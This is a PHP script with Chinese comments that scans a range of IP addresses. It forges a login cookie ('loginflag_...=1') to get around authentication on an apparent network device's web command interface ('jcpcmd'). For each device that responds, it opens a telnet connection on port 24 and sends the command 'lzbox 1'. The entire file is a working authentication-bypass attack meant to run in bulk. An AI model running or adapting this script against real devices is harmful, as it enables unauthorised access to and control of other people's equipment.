<?php
require_once('MyTelnet.class.php');
function get_ip_array($ip,$nums){//获取IP队列
    $last_num = explode('.',$ip)[3];
    $first_num = explode('.',$ip)[0].'.'.explode('.',$ip)[1].'.'.explode('.',$ip)[2].'.';
    $ip_array=array();
    for($i=0;$i<$nums;$i++){
        $new_last_num = $last_num + $i;
        $ip_array[] = $first_num.$new_last_num;
    }
    return $ip_array;
}
function get_version($IP){//获取设备的版本信息
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,"http://".$IP."/?jcpcmd=version%20-act%20list");// 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);	//
    curl_setopt($ch, CURLOPT_HEADER,0);	//
    curl_setopt($ch, CURLOPT_TIMEOUT,3);//
    /*****************伪造cookie******************/
    $cookie="loginflag_192.168.120.227=1";
    curl_setopt($ch, CURLOPT_COOKIE , $cookie );
    /***********************************/
    
    $output = curl_exec($ch);//
    curl_close($ch);
    if($output){
        //$version = explode('=',explode(';',$output)[4])[1];
        return true;
    }else{
        //curl_close($ch);
        return false;
    }
}
$opt=getopt('i:n:');
if(!isset($opt['i'])){
    echo 'please input ip address!';
}else{
    if(!isset($opt['n'])){
        $opt['n']=1;
    }
    $ip=$opt['i'];
    $n=$opt['n'];
    $array=get_ip_array($ip,$n);
    for($i=0;$i<count($array);$i++){
        if(get_version($array[$i])){
            $telnet=new MyTelnet($array[$i],24);
            $res=$telnet->write('lzbox 1');
            echo "$res\r\n";
        }else{
            echo "can't connect device\r\n";
        }
    }
}